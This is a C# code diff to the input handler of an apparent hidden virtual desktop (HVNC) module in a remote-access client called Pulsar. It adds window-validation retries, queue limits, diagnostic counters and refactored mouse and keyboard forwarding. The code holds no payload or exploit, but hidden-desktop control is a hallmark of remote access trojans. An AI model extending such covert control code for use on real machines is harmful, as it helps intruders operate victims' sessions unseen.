@@ -204,10 +204,43 @@ namespace Pulsar.Client.Helper.HVNC
         private bool isAltPressed = false;
         private bool isCapsLockOn = false;
 
+        // Window validation and retry mechanism
+        private int consecutiveWindowLookupFailures = 0;
+        private const int MAX_CONSECUTIVE_FAILURES = 3;
+        private System.Diagnostics.Stopwatch lastFailureLogTime = new System.Diagnostics.Stopwatch();
+
+        // Input queue and flow control
+        private int inputQueueLength = 0;
+        private const int MAX_INPUT_QUEUE_LENGTH = 100;
+        private System.Diagnostics.Stopwatch windowStateTimeout = new System.Diagnostics.Stopwatch();
+        private const int WINDOW_STATE_TIMEOUT_MS = 10000; // 10 second timeout for window state
+
+        // Diagnostic/logging
+        private long totalInputMessagesReceived = 0;
+        private long totalInputMessagesProcessed = 0;
+        private long totalInputMessagesFailed = 0;
+        private long totalWindowLookupFailures = 0;
+        private long totalWindowValidationFailures = 0;
+
         /// <summary>
         /// Gets the desktop handle.
         /// </summary>
         public IntPtr Desktop { get; private set; } = IntPtr.Zero;
+
+        /// <summary>
+        /// Gets diagnostic information about input processing.
+        /// </summary>
+        public string GetDiagnostics()
+        {
+            lock (syncLock)
+            {
+                return $"[InputHandler Diagnostics] Messages: {totalInputMessagesReceived} received, {totalInputMessagesProcessed} processed, {totalInputMessagesFailed} failed | " +
+                       $"Window Lookups: {totalWindowLookupFailures} failed, {totalWindowValidationFailures} validation failures | " +
+                       $"Queue: {inputQueueLength}/{MAX_INPUT_QUEUE_LENGTH} | " +
+                       $"Working Window: 0x{workingWindow:X8} (Valid: {IsValidWindow(workingWindow)}) | " +
+                       $"Consecutive Failures: {consecutiveWindowLookupFailures}";
+            }
+        }
 
         #endregion
 
@@ -562,12 +595,84 @@ namespace Pulsar.Client.Helper.HVNC
                 return new POINT { x = -1, y = -1 };
         }
 
+        /// <summary>
+        /// Verifies that a window handle is valid and exists on the correct desktop.
+        /// </summary>
+        private bool IsValidWindow(IntPtr hWnd)
+        {
+            if (hWnd == IntPtr.Zero)
+                return false;
+
+            try
+            {
+                // Check if window still exists
+                RECT rect;
+                if (!GetWindowRect(hWnd, out rect))
+                {
+                    return false;
+                }
+
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[InputHandler] Window validation error: {ex.Message}");
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// Finds the target window with retry and fallback logic.
+        /// </summary>
+        private IntPtr FindTargetWindow(POINT cursorPosition)
+        {
+            IntPtr hwnd = WindowFromPoint(cursorPosition);
+
+            if (hwnd == IntPtr.Zero)
+            {
+                consecutiveWindowLookupFailures++;
+                
+                // Log failures periodically to avoid spam
+                if (!lastFailureLogTime.IsRunning || lastFailureLogTime.ElapsedMilliseconds > 2000)
+                {
+                    Debug.WriteLine($"[InputHandler] Warning: WindowFromPoint returned null at ({cursorPosition.x}, {cursorPosition.y}). Consecutive failures: {consecutiveWindowLookupFailures}");
+                    if (lastFailureLogTime.IsRunning)
+                        lastFailureLogTime.Restart();
+                    else
+                        lastFailureLogTime.Start();
+                }
+
+                if (consecutiveWindowLookupFailures >= MAX_CONSECUTIVE_FAILURES)
+                {
+                    Debug.WriteLine($"[InputHandler] Max consecutive failures reached ({MAX_CONSECUTIVE_FAILURES}). Clearing cached window.");
+                    workingWindow = IntPtr.Zero;
+                }
+
+                // If we have a cached working window, try to use it
+                if (IsValidWindow(workingWindow))
+                {
+                    Debug.WriteLine($"[InputHandler] Using cached window: 0x{workingWindow:X8}");
+                    return workingWindow;
+                }
+
+                return IntPtr.Zero;
+            }
+
+            // Reset failure counter on successful lookup
+            consecutiveWindowLookupFailures = 0;
+            if (lastFailureLogTime.IsRunning)
+                lastFailureLogTime.Stop();
+
+            return hwnd;
+        }
+
         #endregion
 
         #region Input Processing
 
         /// <summary>
         /// Processes an input message and sends it to the appropriate window.
+        /// Includes queue control, timeout monitoring, and comprehensive logging.
         /// </summary>
         /// <param name="msg">The message to process.</param>
         /// <param name="wParam">The wParam of the message.</param>
@@ -576,116 +681,199 @@ namespace Pulsar.Client.Helper.HVNC
         {
             lock (syncLock)
             {
-                SetThreadDesktop(this.Desktop);
-
-                // Handle mouse messages
-                if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP ||
-                    msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP ||
-                    msg == WM_MOUSEMOVE)
+                try
                 {
-                    int x = GetXCoordinate(lParam);
-                    int y = GetYCoordinate(lParam);
-                    POINT cursorPosition = new POINT { x = x, y = y };
+                    // Track input statistics
+                    totalInputMessagesReceived++;
+                    inputQueueLength++;
 
-                    bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
-                    bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);
-
-                    if (isMovingWindow && isUp && isLeft)
+                    // Queue overflow protection
+                    if (inputQueueLength > MAX_INPUT_QUEUE_LENGTH)
                     {
-                        // If we were moving a window and now released the button, complete the move
-                        SetWindowPos(windowToMove, IntPtr.Zero,
-                            x - lastClickCoords.x,
-                            y - lastClickCoords.y,
-                            lastWindowDimensions.x,
-                            lastWindowDimensions.y,
-                            0);
-                        isMovingWindow = false;
+                        totalInputMessagesFailed++;
+                        inputQueueLength--;
+                        Debug.WriteLine($"[InputHandler] WARNING: Input queue overflow ({inputQueueLength}/{MAX_INPUT_QUEUE_LENGTH}). Dropping message (msg: {msg:X4})");
+                        return;
                     }
 
-                    // Get the window under the cursor
-                    IntPtr hwnd = WindowFromPoint(cursorPosition);
-                    workingWindow = hwnd;
-
-                    if (hwnd != IntPtr.Zero)
+                    // Window state timeout monitoring
+                    if (!windowStateTimeout.IsRunning)
                     {
-                        // Get window information
-                        RECT windowRect;
-                        GetWindowRect(hwnd, out windowRect);
-
-                        // Calculate window position and size
-                        int windowX = windowRect.left;
-                        int windowY = windowRect.top;
-                        int windowWidth = windowRect.right - windowRect.left;
-                        int windowHeight = windowRect.bottom - windowRect.top;
-
-                        // Calculate position relative to window
-                        POINT clickCoords = ScreenToWindow(x, y, windowX, windowY, windowWidth, windowHeight);
-
-                        // Get hit test result to determine what part of the window was clicked
-                        IntPtr hitTestResult = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero, lParam);
-                        int hitTestResultInt = hitTestResult.ToInt32();
-
-                        if (hitTestResultInt == HTCLOSE && msg == WM_LBUTTONUP)
+                        windowStateTimeout.Start();
+                    }
+                    else if (windowStateTimeout.ElapsedMilliseconds > WINDOW_STATE_TIMEOUT_MS && IsValidWindow(workingWindow))
+                    {
+                        // Periodic verification that window is still valid
+                        if (!IsValidWindow(workingWindow))
                         {
-                            // Close button clicked
-                            Debug.WriteLine("Closing window");
-                            PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
-                            PostMessage(hwnd, WM_DESTROY, IntPtr.Zero, IntPtr.Zero);
+                            Debug.WriteLine($"[InputHandler] Window timeout: working window 0x{workingWindow:X8} no longer valid after {windowStateTimeout.ElapsedMilliseconds}ms");
+                            workingWindow = IntPtr.Zero;
+                            windowStateTimeout.Restart();
                         }
-                        else if (hitTestResultInt == HTCAPTION)
-                        {
-                            // Title bar clicked
-                            if (!isUp && isLeft && msg == WM_LBUTTONDOWN)
-                            {
-                                // Start window move operation
-                                lastClickCoords = clickCoords;
-                                lastWindowDimensions = new POINT { x = windowWidth, y = windowHeight };
-                                isMovingWindow = true;
-                                windowToMove = hwnd;
-                                Debug.WriteLine("Starting window move");
-                            }
-                        }
-                        else if (hitTestResultInt == HTMAXBUTTON && msg == WM_LBUTTONUP)
-                        {
-                            // Maximize/Restore button clicked
-                            WINDOWPLACEMENT windowPlacement = default;
-                            windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
-                            GetWindowPlacement(hwnd, ref windowPlacement);
+                    }
 
-                            if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
-                            {
-                                Debug.WriteLine("Restoring window");
-                                PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
-                            }
-                            else
-                            {
-                                Debug.WriteLine("Maximizing window");
-                                PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
-                            }
-                        }
-                        else if (hitTestResultInt == HTMINBUTTON && msg == WM_LBUTTONUP)
-                        {
-                            // Minimize button clicked
-                            Debug.WriteLine("Minimizing window");
-                            PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
-                        }
+                    SetThreadDesktop(this.Desktop);
+
+                    // Handle mouse messages
+                    if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP ||
+                        msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP ||
+                        msg == WM_MOUSEMOVE)
+                    {
+                        HandleMouseInput(msg, wParam, lParam);
+                        totalInputMessagesProcessed++;
+                    }
+                    // Handle keyboard messages
+                    else if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
+                    {
+                        HandleKeyboardInputEx(msg, wParam, lParam);
+                        totalInputMessagesProcessed++;
+                    }
+                    else
+                    {
+                        // Unknown message type
+                        Debug.WriteLine($"[InputHandler] Unknown input message type: {msg:X4}");
+                        totalInputMessagesFailed++;
+                    }
+
+                    inputQueueLength--;
+                }
+                catch (Exception ex)
+                {
+                    totalInputMessagesFailed++;
+                    inputQueueLength--;
+                    Debug.WriteLine($"[InputHandler] Unexpected error in Input method: {ex.Message}\n{ex.StackTrace}");
+                }
+            }
+        }
+
+        /// <summary>
+        /// Handles mouse input with enhanced error tracking.
+        /// </summary>
+        private void HandleMouseInput(uint msg, IntPtr wParam, IntPtr lParam)
+        {
+            int x = GetXCoordinate(lParam);
+            int y = GetYCoordinate(lParam);
+            POINT cursorPosition = new POINT { x = x, y = y };
+
+            bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
+            bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);
+
+            if (isMovingWindow && isUp && isLeft)
+            {
+                // Complete window move operation
+                SetWindowPos(windowToMove, IntPtr.Zero,
+                    x - lastClickCoords.x,
+                    y - lastClickCoords.y,
+                    lastWindowDimensions.x,
+                    lastWindowDimensions.y,
+                    0);
+                isMovingWindow = false;
+            }
+
+            // Find target window with retry logic
+            IntPtr hwnd = FindTargetWindow(cursorPosition);
+            
+            if (hwnd != IntPtr.Zero)
+            {
+                workingWindow = hwnd;
+                totalWindowLookupFailures = 0; // Reset on success
+            }
+            else if (hwnd == IntPtr.Zero && workingWindow == IntPtr.Zero)
+            {
+                totalWindowLookupFailures++;
+                Debug.WriteLine($"[InputHandler] Mouse at ({x}, {y}): no window found (lookup failures: {totalWindowLookupFailures})");
+                return;
+            }
+
+            if (hwnd != IntPtr.Zero)
+            {
+                try
+                {
+                    RECT windowRect;
+                    if (!GetWindowRect(hwnd, out windowRect))
+                    {
+                        totalWindowValidationFailures++;
+                        Debug.WriteLine($"[InputHandler] GetWindowRect failed for 0x{hwnd:X8} (validation failures: {totalWindowValidationFailures})");
+                        workingWindow = IntPtr.Zero;
+                        return;
+                    }
+
+                    int windowX = windowRect.left;
+                    int windowY = windowRect.top;
+                    int windowWidth = windowRect.right - windowRect.left;
+                    int windowHeight = windowRect.bottom - windowRect.top;
+
+                    POINT clickCoords = ScreenToWindow(x, y, windowX, windowY, windowWidth, windowHeight);
+                    IntPtr hitTestResult = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero, lParam);
+                    int hitTestResultInt = hitTestResult.ToInt32();
+
+                    // Route based on hit test result
+                    if (hitTestResultInt == HTCLOSE && msg == WM_LBUTTONUP)
+                    {
+                        PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
+                        PostMessage(hwnd, WM_DESTROY, IntPtr.Zero, IntPtr.Zero);
+                    }
+                    else if (hitTestResultInt == HTCAPTION && !isUp && isLeft && msg == WM_LBUTTONDOWN)
+                    {
+                        lastClickCoords = clickCoords;
+                        lastWindowDimensions = new POINT { x = windowWidth, y = windowHeight };
+                        isMovingWindow = true;
+                        windowToMove = hwnd;
+                    }
+                    else if (hitTestResultInt == HTMAXBUTTON && msg == WM_LBUTTONUP)
+                    {
+                        WINDOWPLACEMENT windowPlacement = default;
+                        windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
+                        GetWindowPlacement(hwnd, ref windowPlacement);
+
+                        if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
+                            PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                         else
-                        {
-                            // Regular window area clicked - forward the mouse message
-                            IntPtr param = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
-                            IntPtr translatedLParam = MakeLParam(clickCoords.x, clickCoords.y);
-                            PostMessage(hwnd, msg, param, translatedLParam);
-                        }
+                            PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                     }
-                }
-                // Handle keyboard messages
-                if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
-                {
-                    if (workingWindow != IntPtr.Zero)
+                    else if (hitTestResultInt == HTMINBUTTON && msg == WM_LBUTTONUP)
                     {
-                        HandleKeyboardInput(msg, wParam, lParam, workingWindow);
+                        PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
+                    }
+                    else
+                    {
+                        // Regular window click
+                        IntPtr param = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
+                        IntPtr translatedLParam = MakeLParam(clickCoords.x, clickCoords.y);
+                        PostMessage(hwnd, msg, param, translatedLParam);
                     }
                 }
+                catch (Exception ex)
+                {
+                    totalInputMessagesFailed++;
+                    Debug.WriteLine($"[InputHandler] Mouse message processing error: {ex.Message}");
+                    workingWindow = IntPtr.Zero;
+                }
+            }
+        }
+
+        /// <summary>
+        /// Handles keyboard input with enhanced validation and error tracking.
+        /// </summary>
+        private void HandleKeyboardInputEx(uint msg, IntPtr wParam, IntPtr lParam)
+        {
+            if (!IsValidWindow(workingWindow))
+            {
+                totalWindowValidationFailures++;
+                Debug.WriteLine($"[InputHandler] Keyboard input: working window invalid (0x{workingWindow:X8}). Clearing and waiting for valid window (validation failures: {totalWindowValidationFailures})");
+                workingWindow = IntPtr.Zero;
+                return;
+            }
+
+            try
+            {
+                HandleKeyboardInput(msg, wParam, lParam, workingWindow);
+            }
+            catch (Exception ex)
+            {
+                totalInputMessagesFailed++;
+                Debug.WriteLine($"[InputHandler] Keyboard processing error: {ex.Message}");
+                workingWindow = IntPtr.Zero;
             }
         }
 
